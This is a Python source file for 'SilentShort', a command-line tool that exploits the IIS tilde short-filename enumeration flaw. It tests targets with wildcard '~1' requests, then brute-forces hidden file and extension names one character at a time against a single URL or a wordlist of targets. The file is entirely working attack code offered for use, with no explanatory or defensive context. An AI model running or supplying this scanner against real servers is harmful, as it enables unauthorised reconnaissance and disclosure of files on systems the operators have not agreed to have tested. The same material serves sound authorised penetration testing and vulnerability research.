import requests
import sys
import argparse

# https://requests.readthedocs.io/en/master/api/#requests.request

class ShortScan:
    def __init__(self, url="", verbose=False, paths=None):
        self.url = url
        self.paths = paths
        self.verbose = verbose
        self.session = requests.Session()
        self.valid_url = ""
        self.valid_urls = []
        self.valid_chars = ""
        self.valid_extension =""
        self.method = ""
        self.test_chars = "abcdefghijklmnopqrstuvwxyz0123456789-_."

    def request(self, url):
        r = self.session.request(self.method, url)
        return r

    def is_vulnerable(self):
        test_url = self.url + "/*~1*/test.aspx"
        bad_url = self.url + "/zzzzz*~1*/test.aspx"
        for method in ["GET", "OPTIONS"]:
            r1 = self.session.request(method, test_url)
            r2 = self.session.request(method, bad_url)
            if r1.status_code == 404 and r2.status_code != 404:
                self.method = method
                return True
        return False

## TODO: Optimise the 3 below functions ##

    def scan(self):
        while self.perform_scan("filename") != 0:
            pass
        while self.perform_scan("ext") != 0:
            pass
        self.valid_chars = ""
        self.valid_extension = ""

    def test_char(self, char, mode):
        if mode == "filename":
            test_url = self.url + f"/{self.valid_chars}{char}*~1*/"
        else:
            test_url = self.url + f"/{self.valid_chars}~1{self.valid_extension}{char}*/"
        r = self.request(test_url)
        if self.verbose:
            print(f"[*] Testing {test_url}",flush=True, end="\r")
        if r.status_code == 404:
            if self.verbose:
                print(f"[+] Found a valid char: {test_url}")
            if mode == "filename":
                self.valid_chars += char
            else:
                self.valid_extension += char
            self.valid_url = test_url
            return 1
        return 0

    def perform_scan(self, mode):
        for char in self.test_chars:
            if(self.test_char(char, mode)):
                return 1
        return 0

##########################################

    def print_results(self):
        print("\n[*] Results:")
        for url in self.valid_urls:
            print(f"[+] {url}")

    def run_scan(self):
        print(f"[*] Testing if {self.url} is vulnerable...")
        if(not self.is_vulnerable()):
            print("[-] Target doesn't look vulnerable.")
            return

        print("[+] Target looks vulnerable !")

        print("[*] Starting the scan...")
        self.scan()
        if self.verbose:
            print(f"[+] Final URL {self.valid_url}")
        self.valid_urls.append(self.valid_url)

    def run(self):
        print("[+] Welcome on SilentShort !")
        if self.paths:
            with open(self.paths, "r") as f:
                self.paths = f.readlines()
            for path in self.paths:
                if "http" not in path:
                    path = "http://" + path
                path = path.strip()
                self.url = path
                print("")
                self.run_scan()
        else:
            self.run_scan()
        
        self.print_results()


def args():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL")
    group.add_argument("-w", "--wordlist", help="List with the paths to scan, for each line specify http://target.com/path_to_examine")
    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")

    args = parser.parse_args()
    return args

if __name__ == "__main__":
    args = args()
    scanner = ShortScan(args.url, args.verbose, args.wordlist)
    scanner.run()
